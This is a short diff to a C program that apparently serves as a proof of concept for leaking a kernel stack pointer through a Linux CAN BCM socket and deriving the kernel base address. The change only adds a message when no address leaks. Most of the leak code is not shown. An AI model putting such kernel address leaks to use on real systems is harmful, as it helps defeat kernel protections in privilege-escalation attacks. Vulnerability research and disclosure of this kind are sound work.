@@ -102,8 +102,10 @@ unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
 
 int main(void) {
   unsigned long addr = get_kernel_addr_from_bcm_msg_head_struct();
-  if (!addr)
-    return 1;
+  if (!addr) {
+    printf("[-] no kernel address leaked via BCM socket\n");
+    return 0;
+  }
 
   printf("leaked stack pointer: %lx\n", addr);
   printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
